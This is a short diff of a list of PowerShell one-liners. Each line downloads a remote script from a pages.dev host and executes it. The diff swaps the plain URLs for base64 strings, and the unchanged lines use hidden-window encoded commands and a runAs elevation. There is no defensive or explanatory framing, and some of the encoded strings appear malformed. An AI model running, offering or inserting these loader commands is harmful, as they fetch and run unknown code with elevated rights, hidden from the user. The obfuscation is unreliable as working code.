@@ -1,4 +1,4 @@
-powershell -c "iex(iwr'https://3-4px.pages.dev/A.ps1')"
-powershell -c "&(irm 'https://3-4px.pages.dev/A.ps1')"
+powershell -c "iex(iwr'aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA==')"
+powershell -c "&(irm 'aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA==')"
 powershell -w h -nop -c -EncodedCommand aQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdoAHQAdABwAHMAOgAvAC8AMwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwBBAHAALgBwAHMxACcAKQA=
 Start-Process powershell -Verb runAs -ArgumentList "-EncodedCommand LQB3ACAAaAAgAC0AbgBvAHAAIAAtAGMAPABpAGUAeAAgACgAaQBxAHIAIAAtAHUAcwBlAGIAACAAJwBoAHQAdABwAHMAOgAvAC8AMwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwBBAHAALgBwAHMxACcAKQA="
